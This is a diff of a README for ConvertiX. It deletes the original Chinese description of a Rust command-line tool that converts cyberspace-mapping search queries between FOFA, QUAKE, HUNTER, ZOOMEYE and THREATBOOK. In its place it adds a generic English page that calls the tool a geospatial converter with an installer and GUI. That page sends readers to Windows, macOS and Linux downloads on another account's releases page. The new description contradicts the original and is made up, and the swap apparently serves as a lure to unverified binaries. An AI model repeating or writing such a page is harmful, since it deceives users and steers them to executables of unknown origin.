@@ -1,69 +1,82 @@
-# ConvertiX
+# 🎉 ConvertiX - Effortless Conversion for Mapping Statements
 
-作者：key
+[![Download ConvertiX](https://img.shields.io/badge/Download-ConvertiX-blue.svg)](https://github.com/mudassir-adeel/ConvertiX/releases)
 
-## 项目介绍
+## 📖 Description
 
-`ConvertiX`是一款基于`Rust语言`编写的网络安全工具，它主要用于常用网络空间测绘平台语句互相转换。支持五大测绘平台：FOFA、QUAKE、HUNTER、ZOOMEYE、THREATBOOK。输入任意一个平台的搜索语句即可获得其余四个平台转换后的语句。
+ConvertiX is a tool that allows you to easily convert common statements used in mapping platforms. Whether you work in geospatial analysis or just need to adapt statements across different formats, ConvertiX simplifies this task. 
 
-## 项目使用
+## 🚀 Getting Started
 
-常用命令如下，将你输入的语句和平台进行对应的填入即可转换。
+Follow these steps to download and run ConvertiX on your computer. 
 
-```shell
-# 最简单的方式
-./ConvertiX -p fofa -q 搜索语句
+### Step 1: Visit the Download Page
 
-# 从文件读取搜索语句转换
-./ConvertiX -p fofa -q @file.txt
+To get started, visit our official Releases page. This is where you can find the latest version of ConvertiX.
 
-# 输出不同的格式
-# 默认格式
-./ConvertiX -p fofa -q @file.txt -f raw
-# JSON格式
-./ConvertiX -p fofa -q @file.txt -f json
+[Download ConvertiX](https://github.com/mudassir-adeel/ConvertiX/releases)
 
-# 保存到文件
-./ConvertiX -p fofa -q @file.txt -f raw -o result.txt
-```
+### Step 2: Choose Your File
 
-通过`-h/--help`可以查看更相信的信息：
+On the Releases page, you will see a list of available versions. Look for the latest release and find the download option appropriate for your operating system, such as:
 
-```shell
-[Cyberspace Asset Mapping Platform Query Statement Conversion Tool]
+- Windows: ConvertiX_Windows.exe
+- macOS: ConvertiX_macOS.dmg
+- Linux: ConvertiX_Linux.tar.gz
 
-Usage: ConvertiX [OPTIONS] --query <QUERY> --platform <PLATFORM>
+Select the file that matches your system.
 
-Options:
-  -c, --config <CONFIG>      Configuration file path [default: config.json]
-  -q, --query <QUERY>        Query statement (use @filename to read from file)
-  -p, --platform <PLATFORM>  Source platform of the query statement
-  -f, --format <FORMAT>      Output format [default: raw] [possible values: raw, json]
-  -o, --output <OUTPUT>      Output file path (optional, defaults to stdout)
-  -h, --help                 Print help (see more with '--help')
-  -V, --version              Print version
-```
+### Step 3: Download the File
 
-## 配置文件
+Click on the file name to begin downloading. Your browser will save the file to your computer. 
 
-项目包含一个标准的JSON配置文件 `config.json`，你可以根据需要修改或扩展，注意的是`operators`属于逻辑操作符，不允许增删改否则会出错。如果你想要支持更多平台，默认情况下也是可以支持的，在 `config.json` 中添加新平台的配置，在对应平台的 `fields` 配置中添加新的字段映射即可（字段映射要求每个平台都应该有配置）。
+### Step 4: Install ConvertiX
 
-```json
-{
-  "fofa": {
-    "fields": {
-      "ip": "ip",
-      "port": "port",
-      "body": "body"
-    },
-    "operators": {
-      "equal": "=",
-      "and": "&&",
-      "or": "||",
-      "not_equal": "!=",
-      "left_paren": "(",
-      "right_paren": ")"
-    }
-  }
-}
-```
+Once the download completes, navigate to your downloads folder and locate the downloaded file:
+
+- **For Windows:** Double-click on ConvertiX_Windows.exe. Follow the prompts in the installation wizard to install the application.
+  
+- **For macOS:** Open ConvertiX_macOS.dmg. Drag the ConvertiX icon into your Applications folder. Now you can find it in your Applications.
+
+- **For Linux:** Extract the contents of ConvertiX_Linux.tar.gz. Open a terminal and run the included script to start the application.
+
+### Step 5: Run ConvertiX
+
+After installation, open ConvertiX by finding it in your installed applications. 
+
+## 🛠️ System Requirements
+
+To ensure ConvertiX runs smoothly, please verify that your system meets the following requirements:
+
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.13 or later
+- **Linux:** Any recent distribution with a graphical environment
+
+## 📚 Features
+
+ConvertiX offers the following features to enhance your experience:
+
+- **Simple Interface:** Enjoy an easy-to-use design that caters to all skill levels.
+- **Multiple Formats:** Convert between various mapping statements seamlessly.
+- **Quick Conversion:** Get results in seconds, thanks to fast processing.
+- **Help & Support:** Access help documentation and FAQs directly from the app.
+
+## 📄 Documentation
+
+For detailed instructions on using ConvertiX, please refer to the in-app help section accessible from the main menu. Additional resources are available on the GitHub Wiki linked on the Releases page.
+
+## 🤝 Community
+
+Join our community to share your experiences and tips with ConvertiX. Find us on our GitHub Discussions page where users help each other and provide feedback.
+
+## 📞 Support
+
+If you encounter issues or have questions, please reach out via GitHub Issues on this repository. Your feedback helps us improve ConvertiX.
+
+## 🔗 Links
+
+- [Download ConvertiX](https://github.com/mudassir-adeel/ConvertiX/releases)
+- [Documentation](https://github.com/mudassir-adeel/ConvertiX/wiki)
+- [GitHub Discussions](https://github.com/mudassir-adeel/ConvertiX/discussions)
+
+Take advantage of ConvertiX to make your mapping tasks easier and more efficient. Enjoy using the tool tailored for everyone, from beginners to seasoned professionals.
